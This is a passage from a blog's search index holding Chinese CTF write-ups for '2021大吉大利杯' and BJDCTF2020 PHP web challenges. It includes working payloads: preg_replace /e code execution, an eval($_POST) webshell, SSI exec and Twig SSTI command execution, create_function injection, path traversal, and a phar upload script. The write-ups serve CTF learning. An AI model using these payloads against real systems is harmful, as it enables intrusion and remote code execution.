die(\u0026#34;I am sorry but you have to leave.\u0026#34;); }else{ extract($_POST); } $ser = filter(serialize(new spaceman($user_name,$pass_word))); $test = unserialize($ser); ?\u0026gt; php://input 与 $_POST 先说说php://input传参的问题，当直接poststr=xxxx的时候可以直接传入变量str，但是当poststr=xxx\u0026amp;pass_word=xxx的时候，php://input会将这一整串赋值给str，因为其中有下划线，所以无法绕过，测试如下：\n上网查找相关资料，发现：\n1 2 3 1.Coentent-Type仅在取值为application/x-www-data-urlencoded和multipart/form-data两种情况下，PHP才会将http请求数据包中相应的数据填入全局变量$_POST 2.只有Coentent-Type为multipart/form-data的时候，PHP不会将http请求数据包中的相应数据填入php://input，否则其它情况都会。 也就是说，Coentent-Type为multipart/form-data时，php://input为空而$_POST不为空，从而绕过该正则。至于如何传呢，我是使用插件Tabbed Postman - REST Client，其他的方法我也不会（菜）\n反序列化 刚开始觉得filter函数吞掉了俩字符，会导致反序列无法正常进行，后面发现，这个filter函数过滤了个寂寞。。。\n正常情况下压根儿就没有ctfshowup给他进行替换。。。所以直接以form-data，post一个pass_word=ctfshowvip即可，user_name随便填\n可能是出题没想到这个非预期吧\nveryphp 也是一道php代码审计，源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); include(\u0026#34;config.php\u0026#34;); class qwq { function __wakeup(){ die(\u0026#34;Access Denied!\u0026#34;); } static function oao(){ show_source(\u0026#34;config.php\u0026#34;); } } $str = file_get_contents(\u0026#34;php://input\u0026#34;); if(preg_match(\u0026#39;/\\`|\\_|\\.|%|\\*|\\~|\\^|\\\u0026#39;|\\\u0026#34;|\\;|\\(|\\)|\\]|g|e|l|i|\\//is\u0026#39;,$str)){ die(\u0026#34;I am sorry but you have to leave.\u0026#34;); }else{ extract($_POST); } if(isset($shaw_root)){ if(preg_match(\u0026#39;/^\\-[a-e][^a-zA-Z0-8]\u0026lt;b\u0026gt;(.*)\u0026gt;{4}\\D*?(abc.*?)p(hp)*\\@R(s|r).$/\u0026#39;, $shaw_root)\u0026amp;\u0026amp; strlen($shaw_root)===29){ echo $hint; }else{ echo \u0026#34;Almost there.\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } }else{ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.\u0026#34;Input correct parameters\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; die(); } if($ans===$SecretNumber){ echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.\u0026#34;Congratulations!\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; call_user_func($my_ans); } php://input 与 $_POST 传参问题与上一题一样，这里就不再赘述了。\n正则 绕了半天不知道这个正则想匹配些啥（可能是我太菜了），不过最后总算是绕过去了，学习正则的话可以参考这篇文章：正则表达式30分钟入门教程，最后给出$shaw_root的值：-a9\u0026lt;b\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;abcaaaaaaaa.php@Rr.。\n$SecretNumber 绕过正则之后得到一个hint：Here is a hint : md5(\u0026quot;shaw\u0026quot;.($SecretNumber).\u0026quot;root\u0026quot;)==166b47a5cb1ca2431a0edfcef200684f \u0026amp;\u0026amp; strlen($SecretNumber)===5，感觉出题人是想让我们根据这个hint把SecretNumber爆出来，但是这里两个变量都可控，应该是被非预期了。。。\ncall_user_func 又是一个变量的call_user_func。。。上回我盯着phpinfo看了大半天。。。这次也是先传入一个phpinfo找找，但是并没发现什么可疑的东西，然后又搜了下flag，也没找到。然后这时候想起最前面的qwq类以及其静态方法，刚开始直接传入my_ans=oao，但是发现行不通。。。于是去Google了一下call_user_func如何调用类的静态方法：\n因为oao函数没有参数，所以可以传入my_ans数组从而调用该静态方法，最后payload：\n虎山行\u0026amp;revenge 这题真的不会，之前也没有做过phar的反序列化，基本上都是靠着各种wp和资料复现的。\n打开之后有个hint：\n访问之后：\n安装看看：\n假装自己扫了一下目录：\n拿到源码之后先拿d盾扫一下：\n好像没啥用，后面同学和我说可以传file直接目录穿越（审计源码能力太差了）：\n然后打开：/ctfshowsecretfilehh：\n利用/mc-admin/page-edit.php?file=../../../../../../../var/www/html/ctfshowsecretfilehh/waf.php读取waf.php源码:\n1 2 3 4 5 6 7 8 \u0026lt;?php function waf($file){ if (preg_match(\u0026#34;/^phar|smtp|dict|zip|compress|file|etc|root|filter|php|flag|ctf|hint|\\.\\.\\//i\u0026#34;,$file)){ die(\u0026#34;姿势太简单啦，来一点骚的？！\u0026#34;); }else{ return $file; } } 再用/mc-admin/page-edit.php?file=../../../upload.php读取upload.php的源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026lt;?php error_reporting(0); // 允许上传的图片后缀 $allowedExts = array(\u0026#34;gif\u0026#34;, \u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); // echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;]; $extension = end($temp); // 获取文件后缀名 if ((($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/gif\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/jpeg\u0026#34;) || ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;type\u0026#34;] == \u0026#34;image/png\u0026#34;)) \u0026amp;\u0026amp; ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;size\u0026#34;] \u0026lt; 2048000) // 小于 2000kb \u0026amp;\u0026amp; in_array($extension, $allowedExts)) { if ($_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] \u0026gt; 0) { echo \u0026#34;文件出错: \u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;error\u0026#34;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if (file_exists(\u0026#34;upload/\u0026#34; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;])) { echo $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;] . \u0026#34; 文件已经存在。 \u0026#34;; } else { $md5_unix_random =substr(md5(time()),0,8); $filename = $md5_unix_random.\u0026#39;.\u0026#39;.$extension; move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;], \u0026#34;upload/\u0026#34; . $filename); echo \u0026#34;上传成功,文件存在upload/\u0026#34;; } } } else { echo \u0026#34;文件类型仅支持jpg、png、gif等图片格式\u0026#34;; } ?\u0026gt; 这里直接参考yu22x师傅博客里的脚本找上传的文件名\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import time import hashlib def geturl(s): a=hashlib.md5(str(int(s)).encode()).hexdigest() return \u0026#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload/\u0026#34;+a[:8]+\u0026#39;.gif\u0026#39; #coding:utf-8 while True: url=\u0026#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload.php\u0026#34; files={\u0026#39;file\u0026#39;:(\u0026#39;exp.gif\u0026#39;, open(\u0026#39;exp.gif\u0026#39;,\u0026#39;rb\u0026#39;), \u0026#39;image/gif\u0026#39; )} r=requests.post(url,files=files) print(r.text) a=time.time() r2=requests.get(geturl(a)) r3=requests.get(geturl(a-1))#存在延时多试几个时间 if(\u0026#34;我的网站\u0026#34; not in r2.text or \u0026#34;我的网站\u0026#34; not in r3.text): print(geturl(a)) print(geturl(a-1)) break else: time.sleep(0.3) 先在/uplaod上传一个phar文件（后缀名已改为gif），然后再用该脚本找文件名：\n然后访问hint.txt:\n访问/ctfshowgetflaghhhh：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php show_source(__FILE__); $unser = $_GET[\u0026#39;unser\u0026#39;]; class Unser { public $username=\u0026#39;Firebasky\u0026#39;; public $password; function __destruct() { if($this-\u0026gt;username==\u0026#39;ctfshow\u0026#39;\u0026amp;\u0026amp;$this-\u0026gt;password==(int)md5(time())){ system(\u0026#39;cp /ctfshow* /var/www/html/flag.txt\u0026#39;); } } } $ctf=@unserialize($unser); system(\u0026#39;rm -rf /var/www/html/flag.txt\u0026#39;); 因为md5之后有一个强制类型转换，所以当md值是字母开头的时候会变成0，所以我们可以令password为0，然后多试几次既可：\n后面有个system('rm -rf /var/www/html/flag.txt');删掉flag，理论上需要条件竞争，但是不知道为啥狂点了几次hackbar的EXECUTE之后就可以直接url访问。。。。迷\nrevenge只有路由的名字不一样，不知道有啥意义。。。迷\n","date":"2021-01-24T17:01:00+08:00","permalink":"https://k1te.cn/p/2021%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%E6%9D%AF/","title":"2021大吉大利杯"},{"content":"BJDCTF2020 wp 在buuoj上面复现的wp，有一些是自己做出来的，有一些是看了wp才做出来了，依然很菜。\nEasy MD5 打开网址之后，在响应标头中找到了hint：\n1 select * from \u0026#39;admin\u0026#39; where password = md5($pass,true) 理论上md5的密码验证是很难破解的，但是这里MD5函数的第二个参数设为true就有漏洞。\n1 2 3 4 md5(\u0026#34;hello\u0026#34;); \u0026gt;\u0026gt;5d41402abc4b2a76b9719d911017c592 md5(\u0026#34;hello\u0026#34;,true); \u0026gt;\u0026gt;]A@*�K*v�q��\u0010\u0017Œ 32字符十六进制数很好理解，16进制字符二进制格式并非真的二进制，二十将十六进制数两个一组，转化成ASCII字符，如，5d =》],41=\u0026gt;A\n因此可以输入特定的字符串，使得md5之后的raw_output中含有or。网上找到了两个：\n1 2 3 4 5 md5(\u0026#34;ffifdyop\u0026#34;,true); \u0026gt;\u0026gt;\u0026#39;or\u0026#39;6�]��!r,��b\u001c md5(\u0026#34;129581926211651571912466741651878684928\u0026#34;,true); \u0026gt;\u0026gt;\u0006�T0D��o#��\u0026#39;or\u0026#39;8 //第二个在该题中无效 第二层是MD5碰撞：\n1 2 3 4 5 6 7 \u0026lt;!-- $a = $GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. --\u0026gt; 因为使用的是!=和==弱类型比较而不是！==和===这种强类型比较，弱类型比较会将‘0E’开头的哈希值解释为科学计数法，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。\n符合条件的一些MD5值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 纯数字类： s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1502113478a 0e861580163291561247404381396064 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s155964671a 0e342768416822451524974117254469 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s1502113478a 0e861580163291561247404381396064 s1836677006a 0e481036490867661113260034900752 s1091221200a 0e940624217856561557816327384675 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s155964671a 0e342768416822451524974117254469 s1665632922a 0e731198061491163073197128363787 s155964671a 0e342768416822451524974117254469 s1091221200a 0e940624217856561557816327384675 s1836677006a 0e481036490867661113260034900752 s1885207154a 0e509367213418206700842008763514 s532378020a 0e220463095855511507588041205815 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s214587387a 0e848240448830537924465865611904 s1502113478a 0e861580163291561247404381396064 s1091221200a 0e940624217856561557816327384675 s1665632922a 0e731198061491163073197128363787 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1665632922a 0e731198061491163073197128363787 s878926199a 0e545993274517709034328855841020 大写字母类： QLTHNDT 0e405967825401955372549139051580 QNKCDZO 0e830400451993494058024219903391 EEIZDOI 0e782601363539291779881938479162 TUFEPMC 0e839407194569345277863905212547 UTIPEZQ 0e382098788231234954670291303879 UYXFLOI 0e552539585246568817348686838809 IHKFRNS 0e256160682445802696926137988570 PJNPDWY 0e291529052894702774557631701704 ABJIHVY 0e755264355178451322893275696586 DQWRASX 0e742373665639232907775599582643 DYAXWCA 0e424759758842488633464374063001 GEGHBXL 0e248776895502908863709684713578 GGHMVOE 0e362766013028313274586933780773 GZECLQZ 0e537612333747236407713628225676 NWWKITQ 0e763082070976038347657360817689 NOOPCJF 0e818888003657176127862245791911 MAUXXQC 0e478478466848439040434801845361 MMHUWUV 0e701732711630150438129209816536 然后是第三层：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php error_reporting(0); include \u0026#34;flag.php\u0026#34;; highlight_file(__FILE__); if($_POST[\u0026#39;param1\u0026#39;]!==$_POST[\u0026#39;param2\u0026#39;]\u0026amp;\u0026amp;md5($_POST[\u0026#39;param1\u0026#39;])===md5($_POST[\u0026#39;param2\u0026#39;])){ echo $flag; } 第三层可以用数组绕过，由于：\n1 2 3 $a[] = 1; echo md5($a) === null; \u0026gt;\u0026gt;1 故：\nMark loves cat 这道题看了很久，刚看到message以及get的时候觉得是xss，但是搞不定，然后去看wp，发现是git源码泄露，然而buu的web用dirsearch扫描的时候永远是429-Too Many Requests\u0026hellip;\u0026hellip;.\n知道是git源码泄露之后用githack下载：\nindex.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; 这个可变变量把我给绕晕了。。。可以看看L\u0026rsquo;Amore大佬的wp\nZJCTF，不过如此 看了看题目，应该是zjctf某道题的改编，首先找到zjctf的题目。\n第一层是一样的，使用data://绕过。payload：\n?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=\n接着看到include函数想到文件包含。\npayload：?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=\u0026amp;file=php://filter/read=convert.base64-encode/resource=next.php\n将base64解码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 刚开始发现getFlag函数定义了没有执行，猜测是使用complex函数来执行这个函数，但是看了好久还是没思路。。。\n然后看了wp才知道preg_replace在/e模式下的RCE\n深入研究preg_replace与代码执行\npayload：?\\S*=${getflag()}\u0026amp;cmd=system('cat /flag');\n当然，都RCE了，也可以一句话木马直接上蚁剑\n?\\S*=${eval($_POST[kite])}\nEasySearch 看到题目的search想到源码泄露，访问index.php.swp得到部分源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start();\tfunction get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; 第一层直接爆破：\n自己写的垃圾脚本：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php for($i = 0;$i \u0026lt; 9999999999; $i++){ if (substr(md5($i),0,6) == \u0026#34;6d0bc1\u0026#34;) { echo \u0026#34;yes\u0026#34;.\u0026#34;\\n\u0026#34;.$i; return; } if ($i%1000000 == 0) echo \u0026#34;***\u0026#34;.\u0026#34;\\n\u0026#34;; } 登陆成功:\n在响应标头里找到随机生成的url：\n打开：\n然后是一个新的知识点：Apache 开启SSI配置使shtml支持 include()和SSI Shell漏洞问题\n本题中没有过滤，直接在username里打就可以了：\n\u0026lt;!--#exec cmd=\u0026quot;ls ../\u0026quot;--\u0026gt;\n\u0026lt;!--#exec cmd=\u0026quot;cat ../flag_990c66bf85a09c664f0b6741840499b2\u0026quot;--\u0026gt;\nCookie is so stable 老图了：\n依次测试： ${7*7}，返回${7*7}，不通过；测试{{7*7}}，返回49，通过；测试 {{7*'7'}}，返回49,判断模板为twig(如果是jinja2返回7777777，并且twig是php，jinja是python)\n知识点链接：一篇文章带你理解漏洞之SSTI漏洞/#2-Twig\nhint:\n根据文章得到payload：\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} 得到flag：\nEzPHP ez不一定ez，但是hard是真的hard\nhint：\nbase32解码：\n得到源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = \u0026#34;1nD3x.php\u0026#34;; $shana = $_GET[\u0026#39;shana\u0026#39;]; $passwd = $_GET[\u0026#39;passwd\u0026#39;]; $arg = \u0026#39;\u0026#39;; $code = \u0026#39;\u0026#39;; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;font color=red\u0026gt;\u0026lt;B\u0026gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!\u0026lt;/B\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) die(\u0026#39;You seem to want to do something bad?\u0026#39;); } if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) { $file = $_GET[\u0026#34;file\u0026#34;]; echo \u0026#34;Neeeeee! Good Job!\u0026lt;br\u0026gt;\u0026#34;; } } else die(\u0026#39;fxck you! What do you want to do ?!\u0026#39;); if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) die(\u0026#39;fxck you! I hate English!\u0026#39;); } } if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) die(\u0026#34;Aqua is the cutest five-year-old child in the world! Isn\u0026#39;t it ?\u0026lt;br\u0026gt;\u0026#34;); if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ){ extract($_GET[\u0026#34;flag\u0026#34;]); echo \u0026#34;Very good! you know my password. But what is flag?\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#34;fxck you! you don\u0026#39;t know my password! And you don\u0026#39;t know sha1! why you come here!\u0026#34;); } if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) { die(\u0026#34;\u0026lt;br /\u0026gt;Neeeeee~! I have disabled all dangerous functions! You can\u0026#39;t get my flag =w=\u0026#34;); } else { include \u0026#34;flag.php\u0026#34;; $code(\u0026#39;\u0026#39;, $arg); } ?\u0026gt; 先看一下第一层过滤：有关$_SERVER的知识\n所以本题中$_SERVER[\u0026lsquo;QUERY_STRING\u0026rsquo;]过滤的是get的参数，直接用url编码绕过即可，有一个小坑就是：一般网上的在线url编码/解码不会对字母数字进行编码，因为：\n\u0026ldquo;\u0026hellip;Only alphanumerics [0-9a-zA-Z], the special characters \u0026ldquo;$-.+!*\u0026rsquo;(),\u0026rdquo; [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.\u0026rdquo;\n\u0026ldquo;只有字母和数字[0-9a-zA-Z]、一些特殊符号\u0026rdquo;$-_.+!*\u0026rsquo;(),\u0026quot;[不包括双引号]、以及某些保留字，才可以不经过编码直接用于URL。\u0026quot;\n一般来说这些字符的url编码就是ascii码前面加个%,具体参考：https://www.w3school.com.cn/tags/html_ref_urlencode.htm\n第二层过滤又要在debu中正则匹配到\u0026quot;aqua_is_cute\u0026quot;并且用^和$卡住了两端，又要求debu !== \u0026ldquo;aqua_is_cute\u0026rdquo; ，看似不可能，但是结尾没有/D的话，$会省略句尾的%0a。所以只需要传入\n1 debu=aqua_is_cute%0a 再url编码一下：\n1 %64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a 第三层过滤是看看$_REQUEST中有没有英文字母，即使是url编码，因为是16进制，所以依然会有英文字母的出现，这里涉及到$_REQUEST的一个特性(bug)：当GET和POST都存在同一个变量名的时候，只获取POST中的值，所以可以通过这个特性来绕过正则的匹配。如图：\n第四层：if (file_get_contents($file) !== 'debu_debu_aqua')就是要在$file中写入“debu_debu_aqua”，可以用php://input或者data://text/plain,(url编写内容)绕过，参考：PHP file_get_contents 绕过\n第五层：PHP 中的sha1()和MD5()函数漏洞\n当传入?shana[]\u0026amp;passwd[]=123时，他俩的sha1都为null，但是两者不相等。\n第六层，也是最后一层了。\n参考：代码审计从入门到放弃(一) \u0026amp; function\n从参考文章可知，\u0026amp;5c即\\打头时可以正常运行var_dump()，但是。。。本题中变量code和arg没办法get。。。\n然后我发现在sha1过滤的地方会执行一个extract函数（刚开始还没看见，找了好久。。。）这是一个经典的变量覆盖的问题。\n不过也有个小坑，就是刚开始不知道如何变量覆盖，网上的资料基本都是extract($_GET); ，直接传入code=xxx\u0026amp;arg=xxx即可；这里的extract($_GET[\u0026quot;flag\u0026quot;]); 需要传入flag[code]=xxx\u0026amp;flag[arg]=xxx\n输入flag[code]=%5cvar_dump\u0026amp;flag[arg]=23333（url编码之后为：%66%6c%61%67%5b%63%6f%64%65%5d=%5c%76%61%72%5f%64%75%6d%70\u0026amp;%66%6c%61%67%5b%61%72%67%5d=2333）进行测试:\n灏卞湪杩欓噷锛屼綘鑳芥嬁鍒板畠鍚楋紵\nF12：\n到这里思路就断了，以为这些生僻字是flag，但是看了wp之后才发现不是。在$code('', $arg);处没有执行任何指令，我还以为被ban的函数这么多，不需要绕过，以及include了flag.php，以及出现了flag字样，导致我以为flag出了，后面是个misc。\n顺着wp的思路往下：因为include了flag.php，所以可以用get_defined_vars()将所有变量dump出来\n本来想试试能不能不利用create_function直接dump，后面发现不行：\n因为此时执行的是var_dump('','get_defined_vars()')，所以还是得利用create_function，原理解析：[科普向] 解析create_function() \u0026amp;\u0026amp; 复现wp\n构造payload：\n1 2 flag[code]=create_function\u0026amp;flag[arg]=}var_dump(get_defined_vars());// url编码之后为：%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e\u0026amp;%66%6c%61%67%5b%61%72%67%5d=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f （刚开始以为过滤了},但是仔细看看发现只过滤了{。。。以及，为什么code不需要%5c）\n将所有变量dump出来之后发现提示真正的flag在rea1fl4g.php\n因为过滤了include，所以可以用require代替include，将rea1fl4g.php包含进来，并且过滤了·，可以用base64绕过\npayload：\n1 2 3 4 flag[code]=create_function\u0026amp;flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// cmVhMWZsNGcucGhw:rea1fl4g.php的base64编码 url编码之后为： %66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e\u0026amp;%66%6c%61%67%5b%61%72%67%5d=%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f 然后得到了一个假的flag：（脸上笑嘻嘻\n根据wp，预期解是取反绕过：\npayload：\n1 flag[code]=create_function\u0026amp;flag[arg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));// 最后终于拿到flag：\nThe mystery of ip 首先找到hint：\n顺着hint随便找了篇文章：php获取客户端IP地址的几种方法\n测试了一下发现是XFF：\n因为先做了Cookie is so stable这一题，两个页面差不多，连hint的位置都一样，所以先考虑SSTI：\n根据上面的图最后测试出来是Smarty：\n网上搜payload直接打：\n","date":"2020-09-28T14:42:08+08:00","permalink":"https://k1te.cn/p/bjdctf2020/","title":"BJDCTF2020"}]